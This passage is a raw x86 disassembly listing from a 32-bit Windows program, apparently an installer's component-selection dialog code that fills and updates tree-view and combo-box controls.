  4049d2:	57                   	push   %edi
  4049d3:	be 00 40 42 00       	mov    $0x424000,%esi
  4049d8:	bf 30 fd 41 00       	mov    $0x41fd30,%edi
  4049dd:	56                   	push   %esi
  4049de:	57                   	push   %edi
  4049df:	e8 89 14 00 00       	call   0x405e6d
  4049e4:	ff 74 24 10          	push   0x10(%esp)
  4049e8:	56                   	push   %esi
  4049e9:	e8 dd 13 00 00       	call   0x405dcb
  4049ee:	ff 74 24 0c          	push   0xc(%esp)
  4049f2:	e8 1e ca ff ff       	call   0x401415
  4049f7:	57                   	push   %edi
  4049f8:	56                   	push   %esi
  4049f9:	e8 6f 14 00 00       	call   0x405e6d
  4049fe:	5f                   	pop    %edi
  4049ff:	5e                   	pop    %esi
  404a00:	c2 08 00             	ret    $0x8
  404a03:	55                   	push   %ebp
  404a04:	8b ec                	mov    %esp,%ebp
  404a06:	83 ec 50             	sub    $0x50,%esp
  404a09:	53                   	push   %ebx
  404a0a:	56                   	push   %esi
  404a0b:	8b 35 44 72 40 00    	mov    0x407244,%esi
  404a11:	57                   	push   %edi
  404a12:	8b 7d 08             	mov    0x8(%ebp),%edi
  404a15:	68 f9 03 00 00       	push   $0x3f9
  404a1a:	57                   	push   %edi
  404a1b:	ff d6                	call   *%esi
  404a1d:	68 08 04 00 00       	push   $0x408
  404a22:	57                   	push   %edi
  404a23:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404a26:	ff d6                	call   *%esi
  404a28:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404a2b:	a1 48 37 42 00       	mov    0x423748,%eax
  404a30:	8b 35 00 72 40 00    	mov    0x407200,%esi
  404a36:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404a39:	a1 30 37 42 00       	mov    0x423730,%eax
  404a3e:	33 db                	xor    %ebx,%ebx
  404a40:	05 94 00 00 00       	add    $0x94,%eax
  404a45:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404a4c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404a4f:	0f 85 1a 02 00 00    	jne    0x404c6f
  404a55:	a1 4c 37 42 00       	mov    0x42374c,%eax
  404a5a:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404a5d:	c1 e0 02             	shl    $0x2,%eax
  404a60:	50                   	push   %eax
  404a61:	6a 40                	push   $0x40
  404a63:	c7 45 f4 02 00 00 00 	movl   $0x2,-0xc(%ebp)
  404a6a:	89 3d 80 37 42 00    	mov    %edi,0x423780
  404a70:	ff 15 60 71 40 00    	call   *0x407160
  404a76:	6a 6e                	push   $0x6e
  404a78:	a3 28 fd 41 00       	mov    %eax,0x41fd28
  404a7d:	ff 35 20 37 42 00    	push   0x423720
  404a83:	ff 15 b0 71 40 00    	call   *0x4071b0
  404a89:	83 0d 1c fd 41 00 ff 	orl    $0xffffffff,0x41fd1c
  404a90:	68 f0 4f 40 00       	push   $0x404ff0
  404a95:	6a fc                	push   $0xfffffffc
  404a97:	8b f8                	mov    %eax,%edi
  404a99:	ff 75 fc             	push   -0x4(%ebp)
  404a9c:	ff 15 48 72 40 00    	call   *0x407248
  404aa2:	53                   	push   %ebx
  404aa3:	6a 06                	push   $0x6
  404aa5:	6a 21                	push   $0x21
  404aa7:	6a 10                	push   $0x10
  404aa9:	6a 10                	push   $0x10
  404aab:	a3 24 fd 41 00       	mov    %eax,0x41fd24
  404ab0:	ff 15 38 70 40 00    	call   *0x407038
  404ab6:	68 ff 00 ff 00       	push   $0xff00ff
  404abb:	57                   	push   %edi
  404abc:	50                   	push   %eax
  404abd:	a3 14 fd 41 00       	mov    %eax,0x41fd14
  404ac2:	ff 15 3c 70 40 00    	call   *0x40703c
  404ac8:	ff 35 14 fd 41 00    	push   0x41fd14
  404ace:	6a 02                	push   $0x2
  404ad0:	68 09 11 00 00       	push   $0x1109
  404ad5:	ff 75 fc             	push   -0x4(%ebp)
  404ad8:	ff d6                	call   *%esi
  404ada:	53                   	push   %ebx
  404adb:	53                   	push   %ebx
  404adc:	68 1c 11 00 00       	push   $0x111c
  404ae1:	ff 75 fc             	push   -0x4(%ebp)
  404ae4:	ff d6                	call   *%esi
  404ae6:	83 f8 10             	cmp    $0x10,%eax
  404ae9:	7d 0d                	jge    0x404af8
  404aeb:	53                   	push   %ebx
  404aec:	6a 10                	push   $0x10
  404aee:	68 1b 11 00 00       	push   $0x111b
  404af3:	ff 75 fc             	push   -0x4(%ebp)
  404af6:	ff d6                	call   *%esi
  404af8:	57                   	push   %edi
  404af9:	ff 15 5c 70 40 00    	call   *0x40705c
  404aff:	33 ff                	xor    %edi,%edi
  404b01:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404b04:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  404b07:	3b c3                	cmp    %ebx,%eax
  404b09:	74 27                	je     0x404b32
  404b0b:	83 ff 20             	cmp    $0x20,%edi
  404b0e:	74 03                	je     0x404b13
  404b10:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404b13:	50                   	push   %eax
  404b14:	53                   	push   %ebx
  404b15:	e8 75 13 00 00       	call   0x405e8f
  404b1a:	50                   	push   %eax
  404b1b:	53                   	push   %ebx
  404b1c:	68 43 01 00 00       	push   $0x143
  404b21:	ff 75 f8             	push   -0x8(%ebp)
  404b24:	ff d6                	call   *%esi
  404b26:	57                   	push   %edi
  404b27:	50                   	push   %eax
  404b28:	68 51 01 00 00       	push   $0x151
  404b2d:	ff 75 f8             	push   -0x8(%ebp)
  404b30:	ff d6                	call   *%esi
  404b32:	47                   	inc    %edi
  404b33:	83 ff 21             	cmp    $0x21,%edi
  404b36:	7c c9                	jl     0x404b01
  404b38:	8b 7d 14             	mov    0x14(%ebp),%edi
  404b3b:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  404b3e:	ff 74 9f 30          	push   0x30(%edi,%ebx,4)
  404b42:	6a 15                	push   $0x15
  404b44:	ff 75 08             	push   0x8(%ebp)
  404b47:	e8 06 f5 ff ff       	call   0x404052
  404b4c:	ff 74 9f 34          	push   0x34(%edi,%ebx,4)
  404b50:	6a 16                	push   $0x16
  404b52:	ff 75 08             	push   0x8(%ebp)
  404b55:	e8 f8 f4 ff ff       	call   0x404052
  404b5a:	33 ff                	xor    %edi,%edi
  404b5c:	33 db                	xor    %ebx,%ebx
  404b5e:	39 3d 4c 37 42 00    	cmp    %edi,0x42374c
  404b64:	0f 8e c4 00 00 00    	jle    0x404c2e
  404b6a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404b6d:	8d 50 08             	lea    0x8(%eax),%edx
  404b70:	89 55 e8             	mov    %edx,-0x18(%ebp)
  404b73:	8d 42 10             	lea    0x10(%edx),%eax
  404b76:	80 38 00             	cmpb   $0x0,(%eax)
  404b79:	0f 84 90 00 00 00    	je     0x404c0f
  404b7f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404b82:	8b 02                	mov    (%edx),%eax
  404b84:	6a 20                	push   $0x20
  404b86:	8b d0                	mov    %eax,%edx
  404b88:	59                   	pop    %ecx
  404b89:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  404b8c:	23 d1                	and    %ecx,%edx
  404b8e:	c7 45 b4 02 00 ff ff 	movl   $0xffff0002,-0x4c(%ebp)
  404b95:	a8 02                	test   $0x2,%al
  404b97:	c7 45 b8 0d 00 00 00 	movl   $0xd,-0x48(%ebp)
  404b9e:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  404ba1:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404ba4:	89 55 c0             	mov    %edx,-0x40(%ebp)
  404ba7:	74 38                	je     0x404be1
  404ba9:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404bac:	c7 45 b8 4d 00 00 00 	movl   $0x4d,-0x48(%ebp)
  404bb3:	50                   	push   %eax
  404bb4:	6a 00                	push   $0x0
  404bb6:	68 00 11 00 00       	push   $0x1100
  404bbb:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  404bc2:	ff 75 fc             	push   -0x4(%ebp)
  404bc5:	ff d6                	call   *%esi
  404bc7:	8b 0d 28 fd 41 00    	mov    0x41fd28,%ecx
  404bcd:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  404bd4:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404bd7:	a1 28 fd 41 00       	mov    0x41fd28,%eax
  404bdc:	8b 1c b8             	mov    (%eax,%edi,4),%ebx
  404bdf:	eb 2e                	jmp    0x404c0f
  404be1:	a8 04                	test   $0x4,%al
  404be3:	74 11                	je     0x404bf6
  404be5:	53                   	push   %ebx
  404be6:	6a 03                	push   $0x3
  404be8:	68 0a 11 00 00       	push   $0x110a
  404bed:	ff 75 fc             	push   -0x4(%ebp)
  404bf0:	ff d6                	call   *%esi
  404bf2:	8b d8                	mov    %eax,%ebx
  404bf4:	eb 19                	jmp    0x404c0f
  404bf6:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404bf9:	50                   	push   %eax
  404bfa:	6a 00                	push   $0x0
  404bfc:	68 00 11 00 00       	push   $0x1100
  404c01:	ff 75 fc             	push   -0x4(%ebp)
  404c04:	ff d6                	call   *%esi
  404c06:	8b 0d 28 fd 41 00    	mov    0x41fd28,%ecx
  404c0c:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404c0f:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404c12:	47                   	inc    %edi
  404c13:	81 c2 18 04 00 00    	add    $0x418,%edx
  404c19:	3b 3d 4c 37 42 00    	cmp    0x42374c,%edi
  404c1f:	89 55 e8             	mov    %edx,-0x18(%ebp)
  404c22:	0f 8c 4b ff ff ff    	jl     0x404b73
  404c28:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  404c2c:	75 19                	jne    0x404c47
  404c2e:	6a f0                	push   $0xfffffff0
  404c30:	ff 75 fc             	push   -0x4(%ebp)
  404c33:	ff 15 9c 71 40 00    	call   *0x40719c
  404c39:	24 fb                	and    $0xfb,%al
  404c3b:	50                   	push   %eax
  404c3c:	6a f0                	push   $0xfffffff0
  404c3e:	ff 75 fc             	push   -0x4(%ebp)
  404c41:	ff 15 48 72 40 00    	call   *0x407248
  404c47:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404c4b:	75 18                	jne    0x404c65
  404c4d:	6a 05                	push   $0x5
  404c4f:	ff 75 f8             	push   -0x8(%ebp)
  404c52:	ff 15 78 72 40 00    	call   *0x407278
  404c58:	ff 75 f8             	push   -0x8(%ebp)
  404c5b:	e8 27 f4 ff ff       	call   0x404087
  404c60:	e9 80 03 00 00       	jmp    0x404fe5
  404c65:	ff 75 fc             	push   -0x4(%ebp)
  404c68:	e8 1a f4 ff ff       	call   0x404087
  404c6d:	33 db                	xor    %ebx,%ebx
  404c6f:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404c76:	75 12                	jne    0x404c8a
  404c78:	33 c9                	xor    %ecx,%ecx
  404c7a:	89 5d 10             	mov    %ebx,0x10(%ebp)
  404c7d:	41                   	inc    %ecx
  404c7e:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404c85:	89 4d 14             	mov    %ecx,0x14(%ebp)
  404c88:	eb 03                	jmp    0x404c8d
  404c8a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404c8d:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404c91:	b8 13 04 00 00       	mov    $0x413,%eax
  404c96:	74 09                	je     0x404ca1
  404c98:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404c9b:	0f 85 e4 00 00 00    	jne    0x404d85
  404ca1:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404ca4:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404ca7:	74 0d                	je     0x404cb6
  404ca9:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  404cb0:	0f 85 cf 00 00 00    	jne    0x404d85
  404cb6:	f6 05 39 37 42 00 02 	testb  $0x2,0x423739
  404cbd:	75 73                	jne    0x404d32
  404cbf:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404cc2:	74 09                	je     0x404ccd
  404cc4:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404cc7:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  404ccb:	75 65                	jne    0x404d32
  404ccd:	33 c9                	xor    %ecx,%ecx
  404ccf:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404cd2:	0f 95 c1             	setne  %cl
  404cd5:	51                   	push   %ecx
  404cd6:	ff 75 fc             	push   -0x4(%ebp)
  404cd9:	e8 73 fc ff ff       	call   0x404951
  404cde:	8b f8                	mov    %eax,%edi
  404ce0:	3b fb                	cmp    %ebx,%edi
  404ce2:	7c 4e                	jl     0x404d32
  404ce4:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404cea:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ced:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  404cf1:	8b 01                	mov    (%ecx),%eax
  404cf3:	a8 10                	test   $0x10,%al
  404cf5:	75 3b                	jne    0x404d32
  404cf7:	a8 40                	test   $0x40,%al
  404cf9:	74 11                	je     0x404d0c
  404cfb:	35 80 00 00 00       	xor    $0x80,%eax
  404d00:	84 c0                	test   %al,%al
  404d02:	79 04                	jns    0x404d08
  404d04:	0c 01                	or     $0x1,%al
  404d06:	eb 07                	jmp    0x404d0f
  404d08:	24 fe                	and    $0xfe,%al
  404d0a:	eb 03                	jmp    0x404d0f
  404d0c:	83 f0 01             	xor    $0x1,%eax
  404d0f:	57                   	push   %edi
  404d10:	89 01                	mov    %eax,(%ecx)
  404d12:	e8 70 c4 ff ff       	call   0x401187
  404d17:	a1 38 37 42 00       	mov    0x423738,%eax
  404d1c:	47                   	inc    %edi
  404d1d:	f7 d0                	not    %eax
  404d1f:	c1 e8 08             	shr    $0x8,%eax
  404d22:	83 e0 01             	and    $0x1,%eax
  404d25:	89 7d 10             	mov    %edi,0x10(%ebp)
  404d28:	89 45 14             	mov    %eax,0x14(%ebp)
  404d2b:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404d32:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  404d35:	74 4e                	je     0x404d85
  404d37:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d3a:	81 78 08 6e fe ff ff 	cmpl   $0xfffffe6e,0x8(%eax)
  404d41:	75 0e                	jne    0x404d51
  404d43:	ff 70 5c             	push   0x5c(%eax)
  404d46:	53                   	push   %ebx
  404d47:	68 19 04 00 00       	push   $0x419
  404d4c:	ff 75 fc             	push   -0x4(%ebp)
  404d4f:	ff d6                	call   *%esi
  404d51:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404d54:	81 78 08 6a fe ff ff 	cmpl   $0xfffffe6a,0x8(%eax)
  404d5b:	75 28                	jne    0x404d85
  404d5d:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404d61:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d64:	8b 40 5c             	mov    0x5c(%eax),%eax
  404d67:	75 0f                	jne    0x404d78
  404d69:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404d6f:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404d73:	83 08 20             	orl    $0x20,(%eax)
  404d76:	eb 0d                	jmp    0x404d85
  404d78:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  404d7e:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404d82:	83 20 df             	andl   $0xffffffdf,(%eax)
  404d85:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404d8c:	75 6f                	jne    0x404dfd
  404d8e:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  404d94:	0f 85 4b 02 00 00    	jne    0x404fe5
  404d9a:	8b 45 10             	mov    0x10(%ebp),%eax
  404d9d:	c1 e8 10             	shr    $0x10,%eax
  404da0:	66 3d 01 00          	cmp    $0x1,%ax
  404da4:	0f 85 3b 02 00 00    	jne    0x404fe5
  404daa:	53                   	push   %ebx
  404dab:	53                   	push   %ebx
  404dac:	68 47 01 00 00       	push   $0x147
  404db1:	ff 75 f8             	push   -0x8(%ebp)
  404db4:	ff d6                	call   *%esi
  404db6:	83 f8 ff             	cmp    $0xffffffff,%eax
  404db9:	0f 84 26 02 00 00    	je     0x404fe5
  404dbf:	53                   	push   %ebx
  404dc0:	50                   	push   %eax
  404dc1:	68 50 01 00 00       	push   $0x150
  404dc6:	ff 75 f8             	push   -0x8(%ebp)
  404dc9:	ff d6                	call   *%esi
  404dcb:	8b f8                	mov    %eax,%edi
  404dcd:	83 ff ff             	cmp    $0xffffffff,%edi
  404dd0:	74 08                	je     0x404dda
  404dd2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404dd5:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  404dd8:	75 03                	jne    0x404ddd
  404dda:	6a 20                	push   $0x20
  404ddc:	5f                   	pop    %edi
  404ddd:	57                   	push   %edi
  404dde:	e8 c0 c4 ff ff       	call   0x4012a3
  404de3:	57                   	push   %edi
  404de4:	53                   	push   %ebx
  404de5:	68 20 04 00 00       	push   $0x420
  404dea:	ff 75 08             	push   0x8(%ebp)
  404ded:	ff d6                	call   *%esi
  404def:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  404df3:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404df6:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404dfd:	b8 00 02 00 00       	mov    $0x200,%eax
  404e02:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404e05:	75 08                	jne    0x404e0f
  404e07:	53                   	push   %ebx
  404e08:	53                   	push   %ebx
  404e09:	50                   	push   %eax
  404e0a:	ff 75 fc             	push   -0x4(%ebp)
  404e0d:	ff d6                	call   *%esi
  404e0f:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404e16:	75 32                	jne    0x404e4a
  404e18:	a1 14 fd 41 00       	mov    0x41fd14,%eax
  404e1d:	3b c3                	cmp    %ebx,%eax
  404e1f:	74 07                	je     0x404e28
  404e21:	50                   	push   %eax
  404e22:	ff 15 40 70 40 00    	call   *0x407040
  404e28:	a1 28 fd 41 00       	mov    0x41fd28,%eax
  404e2d:	3b c3                	cmp    %ebx,%eax
  404e2f:	74 07                	je     0x404e38
  404e31:	50                   	push   %eax
  404e32:	ff 15 24 71 40 00    	call   *0x407124
  404e38:	89 1d 14 fd 41 00    	mov    %ebx,0x41fd14
  404e3e:	89 1d 28 fd 41 00    	mov    %ebx,0x41fd28
  404e44:	89 1d 80 37 42 00    	mov    %ebx,0x423780
  404e4a:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404e51:	0f 85 50 01 00 00    	jne    0x404fa7
  404e57:	53                   	push   %ebx
  404e58:	53                   	push   %ebx
  404e59:	e8 9b c3 ff ff       	call   0x4011f9
  404e5e:	8b 45 10             	mov    0x10(%ebp),%eax
  404e61:	3b c3                	cmp    %ebx,%eax
  404e63:	74 0e                	je     0x404e73
  404e65:	83 f8 ff             	cmp    $0xffffffff,%eax
  404e68:	74 01                	je     0x404e6b
  404e6a:	48                   	dec    %eax
  404e6b:	50                   	push   %eax
  404e6c:	6a 08                	push   $0x8
  404e6e:	e8 5e fb ff ff       	call   0x4049d1
  404e73:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  404e76:	74 3f                	je     0x404eb7
  404e78:	ff 35 28 fd 41 00    	push   0x41fd28
  404e7e:	e8 69 c4 ff ff       	call   0x4012ec
  404e83:	8b f8                	mov    %eax,%edi
  404e85:	57                   	push   %edi
  404e86:	e8 18 c4 ff ff       	call   0x4012a3
  404e8b:	33 c0                	xor    %eax,%eax
  404e8d:	33 c9                	xor    %ecx,%ecx
  404e8f:	3b fb                	cmp    %ebx,%edi
  404e91:	7e 0e                	jle    0x404ea1
  404e93:	8b 55 ec             	mov    -0x14(%ebp),%edx
  404e96:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  404e99:	74 01                	je     0x404e9c
  404e9b:	41                   	inc    %ecx
  404e9c:	40                   	inc    %eax
  404e9d:	3b c7                	cmp    %edi,%eax
  404e9f:	7c f2                	jl     0x404e93
  404ea1:	53                   	push   %ebx
  404ea2:	51                   	push   %ecx
  404ea3:	68 4e 01 00 00       	push   $0x14e
  404ea8:	ff 75 f8             	push   -0x8(%ebp)
  404eab:	ff d6                	call   *%esi
  404ead:	89 7d 14             	mov    %edi,0x14(%ebp)
  404eb0:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  404eb7:	53                   	push   %ebx
  404eb8:	53                   	push   %ebx
  404eb9:	e8 3b c3 ff ff       	call   0x4011f9
  404ebe:	a1 28 fd 41 00       	mov    0x41fd28,%eax
  404ec3:	39 1d 4c 37 42 00    	cmp    %ebx,0x42374c
  404ec9:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404ecc:	a1 48 37 42 00       	mov    0x423748,%eax
  404ed1:	c7 45 c8 30 f0 00 00 	movl   $0xf030,-0x38(%ebp)
  404ed8:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404edb:	0f 8e 9c 00 00 00    	jle    0x404f7d
  404ee1:	8d 78 08             	lea    0x8(%eax),%edi
  404ee4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404ee7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404eea:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404eed:	3b c3                	cmp    %ebx,%eax
  404eef:	74 74                	je     0x404f65
  404ef1:	8b 0f                	mov    (%edi),%ecx
  404ef3:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404ef6:	f6 c5 01             	test   $0x1,%ch
  404ef9:	c7 45 bc 08 00 00 00 	movl   $0x8,-0x44(%ebp)
  404f00:	74 11                	je     0x404f13
  404f02:	8d 47 10             	lea    0x10(%edi),%eax
  404f05:	c7 45 bc 09 00 00 00 	movl   $0x9,-0x44(%ebp)
  404f0c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404f0f:	80 67 01 fe          	andb   $0xfe,0x1(%edi)
  404f13:	f6 c1 40             	test   $0x40,%cl
  404f16:	74 05                	je     0x404f1d
  404f18:	6a 03                	push   $0x3
  404f1a:	58                   	pop    %eax
  404f1b:	eb 0e                	jmp    0x404f2b
  404f1d:	8b c1                	mov    %ecx,%eax
  404f1f:	83 e0 01             	and    $0x1,%eax
  404f22:	40                   	inc    %eax
  404f23:	f6 c1 10             	test   $0x10,%cl
  404f26:	74 03                	je     0x404f2b
  404f28:	83 c0 03             	add    $0x3,%eax
  404f2b:	8b d1                	mov    %ecx,%edx
  404f2d:	ff 75 c0             	push   -0x40(%ebp)
  404f30:	c1 e0 0b             	shl    $0xb,%eax
  404f33:	83 e2 08             	and    $0x8,%edx
  404f36:	0b c2                	or     %edx,%eax
  404f38:	8b d1                	mov    %ecx,%edx
  404f3a:	c1 f9 05             	sar    $0x5,%ecx
  404f3d:	03 c0                	add    %eax,%eax
  404f3f:	83 e2 20             	and    $0x20,%edx
  404f42:	83 e1 01             	and    $0x1,%ecx
  404f45:	0b c2                	or     %edx,%eax
  404f47:	41                   	inc    %ecx
  404f48:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  404f4b:	51                   	push   %ecx
  404f4c:	68 02 11 00 00       	push   $0x1102
  404f51:	ff 75 fc             	push   -0x4(%ebp)
  404f54:	ff d6                	call   *%esi
  404f56:	8d 45 bc             	lea    -0x44(%ebp),%eax
  404f59:	50                   	push   %eax
  404f5a:	53                   	push   %ebx
  404f5b:	68 0d 11 00 00       	push   $0x110d
  404f60:	ff 75 fc             	push   -0x4(%ebp)
  404f63:	ff d6                	call   *%esi
  404f65:	ff 45 f0             	incl   -0x10(%ebp)
  404f68:	81 c7 18 04 00 00    	add    $0x418,%edi
  404f6e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404f71:	3b 05 4c 37 42 00    	cmp    0x42374c,%eax
  404f77:	0f 8c 67 ff ff ff    	jl     0x404ee4
  404f7d:	6a 01                	push   $0x1
  404f7f:	53                   	push   %ebx
  404f80:	ff 75 fc             	push   -0x4(%ebp)
  404f83:	ff 15 fc 71 40 00    	call   *0x4071fc
  404f89:	a1 fc 2e 42 00       	mov    0x422efc,%eax
  404f8e:	39 58 10             	cmp    %ebx,0x10(%eax)
  404f91:	74 14                	je     0x404fa7
  404f93:	6a 05                	push   $0x5
  404f95:	e8 8a f9 ff ff       	call   0x404924
  404f9a:	50                   	push   %eax
  404f9b:	6a fb                	push   $0xfffffffb
  404f9d:	68 ff 03 00 00       	push   $0x3ff
  404fa2:	e8 65 f9 ff ff       	call   0x40490c
  404fa7:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  404fae:	75 35                	jne    0x404fe5
  404fb0:	f6 05 39 37 42 00 01 	testb  $0x1,0x423739
  404fb7:	74 2c                	je     0x404fe5
  404fb9:	33 c0                	xor    %eax,%eax
  404fbb:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  404fbf:	8b 35 78 72 40 00    	mov    0x407278,%esi
  404fc5:	0f 94 c0             	sete   %al
  404fc8:	c1 e0 03             	shl    $0x3,%eax
  404fcb:	8b f8                	mov    %eax,%edi
  404fcd:	57                   	push   %edi
  404fce:	ff 75 fc             	push   -0x4(%ebp)
  404fd1:	ff d6                	call   *%esi
  404fd3:	57                   	push   %edi
  404fd4:	68 fe 03 00 00       	push   $0x3fe
  404fd9:	ff 75 08             	push   0x8(%ebp)
  404fdc:	ff 15 44 72 40 00    	call   *0x407244
  404fe2:	50                   	push   %eax
  404fe3:	ff d6                	call   *%esi
  404fe5:	ff 75 14             	push   0x14(%ebp)
  404fe8:	ff 75 10             	push   0x10(%ebp)
  404feb:	ff 75 0c             	push   0xc(%ebp)
  404fee:	e8 c6 f0 ff ff       	call   0x4040b9
  404ff3:	5f                   	pop    %edi
  404ff4:	5e                   	pop    %esi
  404ff5:	5b                   	pop    %ebx
  404ff6:	c9                   	leave
  404ff7:	c2 10 00             	ret    $0x10
  404ffa:	55                   	push   %ebp
  404ffb:	8b ec                	mov    %esp,%ebp
  404ffd:	53                   	push   %ebx
  404ffe:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405001:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  405007:	57                   	push   %edi
  405008:	75 14                	jne    0x40501e
  40500a:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  40500e:	75 59                	jne    0x405069
  405010:	68 13 04 00 00       	push   $0x413
  405015:	e8 84 f0 ff ff       	call   0x40409e
  40501a:	33 c0                	xor    %eax,%eax
  40501c:	eb 62                	jmp    0x405080
  40501e:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  405024:	75 20                	jne    0x405046
  405026:	ff 75 08             	push   0x8(%ebp)
  405029:	ff 15 b8 71 40 00    	call   *0x4071b8
  40502f:	85 c0                	test   %eax,%eax
  405031:	74 36                	je     0x405069
  405033:	6a 01                	push   $0x1
  405035:	ff 75 08             	push   0x8(%ebp)
  405038:	e8 14 f9 ff ff       	call   0x404951
  40503d:	8b f8                	mov    %eax,%edi
  40503f:	bb 19 04 00 00       	mov    $0x419,%ebx
  405044:	eb 03                	jmp    0x405049
  405046:	8b 7d 14             	mov    0x14(%ebp),%edi
  405049:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  40504f:	75 1b                	jne    0x40506c
  405051:	39 3d 1c fd 41 00    	cmp    %edi,0x41fd1c
  405057:	74 13                	je     0x40506c
  405059:	57                   	push   %edi
  40505a:	6a 06                	push   $0x6
  40505c:	89 3d 1c fd 41 00    	mov    %edi,0x41fd1c
  405062:	e8 6a f9 ff ff       	call   0x4049d1
  405067:	eb 03                	jmp    0x40506c
  405069:	8b 7d 14             	mov    0x14(%ebp),%edi
  40506c:	57                   	push   %edi
  40506d:	ff 75 10             	push   0x10(%ebp)
  405070:	53                   	push   %ebx
  405071:	ff 75 08             	push   0x8(%ebp)
  405074:	ff 35 24 fd 41 00    	push   0x41fd24
  40507a:	ff 15 b4 71 40 00    	call   *0x4071b4
  405080:	5f                   	pop    %edi
  405081:	5b                   	pop    %ebx
  405082:	5d                   	pop    %ebp
  405083:	c2 10 00             	ret    $0x10
  405086:	55                   	push   %ebp
  405087:	8b ec                	mov    %esp,%ebp
  405089:	83 ec 30             	sub    $0x30,%esp
  40508c:	a1 04 2f 42 00       	mov    0x422f04,%eax
  405091:	53                   	push   %ebx
  405092:	33 db                	xor    %ebx,%ebx
  405094:	56                   	push   %esi
  405095:	3b c3                	cmp    %ebx,%eax
  405097:	57                   	push   %edi
  405098:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40509b:	0f 84 b0 00 00 00    	je     0x405151
  4050a1:	a1 d4 37 42 00       	mov    0x4237d4,%eax
  4050a6:	be 10 f5 41 00       	mov    $0x41f510,%esi
  4050ab:	8b f8                	mov    %eax,%edi
  4050ad:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4050b0:	83 e7 01             	and    $0x1,%edi
  4050b3:	75 09                	jne    0x4050be
  4050b5:	ff 75 08             	push   0x8(%ebp)
  4050b8:	56                   	push   %esi
  4050b9:	e8 d1 0d 00 00       	call   0x405e8f
  4050be:	56                   	push   %esi
  4050bf:	e8 bf 0d 00 00       	call   0x405e83
  4050c4:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4050c7:	89 45 08             	mov    %eax,0x8(%ebp)
  4050ca:	74 1b                	je     0x4050e7
